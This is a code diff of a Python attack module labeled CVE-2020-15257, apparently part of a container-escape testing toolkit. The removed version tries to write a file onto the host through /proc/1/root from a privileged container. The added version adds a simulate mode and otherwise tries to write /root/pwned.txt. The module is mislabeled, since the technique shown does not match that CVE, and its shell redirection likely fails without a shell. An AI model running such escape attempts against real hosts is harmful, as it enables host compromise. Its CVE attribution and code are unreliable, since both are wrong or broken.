@@ -1,27 +1,24 @@
 # attacks/cve_2020_15257.py
 
-import os
+def run(container, simulate=False):
+    print("[*] Running CVE-2020-15257 exploit...")
 
-def is_vulnerable(env_info):
-    """
-    Check for basic conditions where CVE-2020-15257 may apply.
-    It typically requires a privileged container running as root.
-    We'll heuristically check if /proc/1/root exists and points to host FS.
-    """
-    return os.path.exists("/proc/1/root/etc/hostname")
-
-def run(container):
-    """
-    Attempt to overwrite a file on the host via /proc/1/root path.
-    This simulates an escape via privileged container access.
-    """
-    print(f"[CVE-2020-15257] Trying to overwrite /proc/1/root/tmp/pwned.txt")
+    if simulate:
+        # Simulated execution: no file system changes
+        print(f"[SIMULATE] Would attempt to overwrite root filesystem inside privileged container '{container.name}'")
+        return "Simulated run: No changes made."
 
     try:
-        result = container.exec_run("echo 'owned by container' > /proc/1/root/tmp/pwned.txt", privileged=True)
-        if result.exit_code == 0:
-            return "Exploit attempt complete: wrote to host /tmp/pwned.txt via /proc/1/root"
-        else:
-            return f"Exploit failed: {result.output.decode()}"
+        # ⚠️ WARNING: Privileged Container Root Filesystem Overwrite
+        # This exploit targets containers running in privileged mode to overwrite the root filesystem.
+        # If successful, it can allow full host compromise depending on mount configuration.
+        # Note: Should only be run in controlled testing environments.
+
+        print(f"[!] WARNING: Attempting to overwrite container root filesystem")
+        exec_result = container.exec_run("echo 'root overwrite attempt' > /root/pwned.txt", privileged=True)
+        print(f"[+] Exploit attempted. Output: {exec_result.output.decode()}")
+        return "Executed: Attempted to overwrite root filesystem"
+
     except Exception as e:
-        return f"Exploit failed with exception: {str(e)}"
+        print(f"[!] Exploit failed: {e}")
+        return f"Failed: {str(e)}"
